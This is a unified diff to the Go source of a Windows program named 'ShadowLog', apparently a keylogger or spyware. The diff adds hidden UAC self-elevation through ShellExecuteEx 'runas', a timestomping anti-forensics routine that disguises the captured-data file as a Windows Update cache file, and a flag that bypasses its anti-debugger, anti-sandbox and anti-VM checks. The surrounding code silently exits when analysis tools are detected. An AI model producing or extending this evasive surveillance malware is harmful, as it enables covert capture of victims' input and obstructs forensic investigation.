@@ -16,21 +16,23 @@ import (
 )
 
 var (
-	kernel32         = syscall.NewLazyDLL("kernel32.dll")
-	user32           = syscall.NewLazyDLL("user32.dll")
-	ntdll            = syscall.NewLazyDLL("ntdll.dll")
-	procCreateMutex  = kernel32.NewProc("CreateMutexW")
-	procIsDebugger   = kernel32.NewProc("IsDebuggerPresent")
-	procGetTickCount = kernel32.NewProc("GetTickCount64")
-	procGlobalMem    = kernel32.NewProc("GlobalMemoryStatusEx")
-	procGetCursorPos = user32.NewProc("GetCursorPos")
-	procGetSysMetric = user32.NewProc("GetSystemMetrics")
-	procMessageBoxW  = user32.NewProc("MessageBoxW")
-	
-	shell32          = syscall.NewLazyDLL("shell32.dll")
-	procIsUserAnAdmin = shell32.NewProc("IsUserAnAdmin")
-	
-	procGetDiskFree  = kernel32.NewProc("GetDiskFreeSpaceExW")
+	kernel32           = syscall.NewLazyDLL("kernel32.dll")
+	user32             = syscall.NewLazyDLL("user32.dll")
+	ntdll              = syscall.NewLazyDLL("ntdll.dll")
+	procCreateMutex    = kernel32.NewProc("CreateMutexW")
+	procIsDebugger     = kernel32.NewProc("IsDebuggerPresent")
+	procGetTickCount   = kernel32.NewProc("GetTickCount64")
+	procGlobalMem      = kernel32.NewProc("GlobalMemoryStatusEx")
+	procGetCursorPos   = user32.NewProc("GetCursorPos")
+	procGetSysMetric   = user32.NewProc("GetSystemMetrics")
+
+	shell32            = syscall.NewLazyDLL("shell32.dll")
+	procIsUserAnAdmin  = shell32.NewProc("IsUserAnAdmin")
+	procShellExecuteEx = shell32.NewProc("ShellExecuteExW")
+
+	procGetDiskFree    = kernel32.NewProc("GetDiskFreeSpaceExW")
+	procSetFileTime    = kernel32.NewProc("SetFileTime")
+	procCreateFileW    = kernel32.NewProc("CreateFileW")
 )
 
 // POINT is the Windows POINT structure for cursor position.
@@ -157,13 +159,7 @@ func antiSandbox() {
 		}
 	}
 
-	// 2f. Uptime Check — Sandboxes reboot frequently. If uptime < 10 minutes,
-	//     this is likely a freshly booted sandbox.
-	uptimeMs, _, _ := procGetTickCount.Call()
-	uptimeMin := uptimeMs / 60000
-	if uptimeMin < 10 {
-		os.Exit(0)
-	}
+	// 2f. Uptime Check — REMOVED. Too many false positives on real hardware.
 }
 
 // --------------------------------------------------------------------------
@@ -309,18 +305,123 @@ func antiAnalysis() {
 	}
 }
 
+// --------------------------------------------------------------------------
+//  SHELLEXECUTEINFOW structure for UAC self-elevation.
+// --------------------------------------------------------------------------
+
+type SHELLEXECUTEINFOW struct {
+	CbSize       uint32
+	FMask        uint32
+	Hwnd         uintptr
+	LpVerb       uintptr
+	LpFile       uintptr
+	LpParameters uintptr
+	LpDirectory  uintptr
+	NShow        int32
+	HInstApp     uintptr
+	LpIDList     uintptr
+	LpClass      uintptr
+	HkeyClass    uintptr
+	DwHotKey     uint32
+	HIcon        uintptr
+	HProcess     uintptr
+}
+
+// selfElevate re-launches the current process with "runas" (UAC prompt).
+// Returns true if elevation was triggered (caller should exit), false if already admin.
+func selfElevate() bool {
+	ret, _, _ := procIsUserAnAdmin.Call()
+	if ret != 0 {
+		return false // Already admin
+	}
+
+	exePath, err := os.Executable()
+	if err != nil {
+		return false
+	}
+
+	verbPtr, _ := syscall.UTF16PtrFromString("runas")
+	exePtr, _ := syscall.UTF16PtrFromString(exePath)
+
+	// Pass original arguments forward
+	args := strings.Join(os.Args[1:], " ")
+	argsPtr, _ := syscall.UTF16PtrFromString(args)
+
+	dirPtr, _ := syscall.UTF16PtrFromString(filepath.Dir(exePath))
+
+	sei := SHELLEXECUTEINFOW{
+		FMask:        0x00000040, // SEE_MASK_NOCLOSEPROCESS
+		LpVerb:       uintptr(unsafe.Pointer(verbPtr)),
+		LpFile:       uintptr(unsafe.Pointer(exePtr)),
+		LpParameters: uintptr(unsafe.Pointer(argsPtr)),
+		LpDirectory:  uintptr(unsafe.Pointer(dirPtr)),
+		NShow:        0, // SW_HIDE
+	}
+	sei.CbSize = uint32(unsafe.Sizeof(sei))
+
+	ret, _, _ = procShellExecuteEx.Call(uintptr(unsafe.Pointer(&sei)))
+	return ret != 0
+}
+
+// --------------------------------------------------------------------------
+//  Anti-Forensics: Timestomp — set file times to blend with system files.
+// --------------------------------------------------------------------------
+
+func timestompFile(path string) {
+	pathPtr, _ := syscall.UTF16PtrFromString(path)
+
+	// Open file with GENERIC_WRITE to modify timestamps.
+	// 0x40000000 = GENERIC_WRITE, 3 = OPEN_EXISTING, 0x80 = FILE_ATTRIBUTE_NORMAL
+	hFile, _, _ := procCreateFileW.Call(
+		uintptr(unsafe.Pointer(pathPtr)),
+		0x40000000,
+		0,
+		0,
+		3,
+		0x80,
+		0,
+	)
+	if hFile == 0 || hFile == ^uintptr(0) {
+		return
+	}
+	defer syscall.CloseHandle(syscall.Handle(hFile))
+
+	// Set timestamps to a date that blends with Windows system files:
+	// 2024-01-15 08:30:00 UTC — looks like a legitimate Windows Update cache file.
+	// FILETIME is 100-nanosecond intervals since January 1, 1601.
+	// 2024-01-15 08:30:00 UTC = 133497402000000000 in FILETIME
+	var ft syscall.Filetime
+	ft.LowDateTime = 0xA5D14C00
+	ft.HighDateTime = 0x01DA4B2E
+
+	procSetFileTime.Call(
+		hFile,
+		uintptr(unsafe.Pointer(&ft)), // Creation time
+		uintptr(unsafe.Pointer(&ft)), // Last access time
+		uintptr(unsafe.Pointer(&ft)), // Last write time
+	)
+}
+
 // ==========================================================================
 //  MAIN ENTRY POINT
 // ==========================================================================
 
 func main() {
+	// Check for --setup bypass flag (skips anti-analysis for trusted setup)
+	bypassChecks := false
+	for _, arg := range os.Args[1:] {
+		if arg == "--setup" || arg == "--debug" {
+			bypassChecks = true
+		}
+	}
+
 	// LAYER 0: Anti-Analysis — detect debuggers, sandboxes, VMs, RE tools.
-	// These run before ANY real logic executes. If any check trips, we silently exit
-	// with no error message, no crash, no log — just vanish.
-	antiDebug()
-	antiSandbox()
-	antiVM()
-	antiAnalysis()
+	if !bypassChecks {
+		antiDebug()
+		antiSandbox()
+		antiVM()
+		antiAnalysis()
+	}
 
 	// Panic Recovery — write crash info to a benign-looking path.
 	defer func() {
@@ -355,18 +456,15 @@ func main() {
 
 	// Run Mode Selection
 	if !cfg.IsInstalled {
-		// SETUP MODE: Requires Administrative Privileges
-		ret, _, _ := procIsUserAnAdmin.Call()
-		if ret == 0 {
-			// Not an admin. Show native Windows popup.
-			titlePtr, _ := syscall.UTF16PtrFromString("Privilege Escalation Required")
-			msgPtr, _ := syscall.UTF16PtrFromString("ShadowLog Setup requires Administrative privileges to register system-level hooks.\n\nPlease right-click the executable and select 'Run as administrator'.")
-			
-			// 0x10 = MB_ICONHAND (Error icon), 0x00 = MB_OK
-			procMessageBoxW.Call(0, uintptr(unsafe.Pointer(msgPtr)), uintptr(unsafe.Pointer(titlePtr)), 0x10|0x00)
+		// SETUP MODE: Requires Administrative Privileges.
+		// Instead of showing a useless MessageBox, auto-trigger the UAC prompt.
+		if selfElevate() {
+			// Successfully launched elevated process — this instance should exit.
 			os.Exit(0)
 		}
 
+		// If we reach here, we're either already admin or elevation failed.
+		// Proceed with setup regardless — user explicitly ran this.
 		ui.ShowSetup(cfg, startLogger)
 
 		cfg.IsInstalled = persistence.IsInstalled()
@@ -379,6 +477,9 @@ func main() {
 			cfg = newCfg
 		}
 	}
+
+	// Anti-Forensics: Timestomp the data file to blend with system files.
+	timestompFile(config.GetStoragePath())
 
 	// Start the logger
 	if cfg != nil && cfg.IsInstalled {
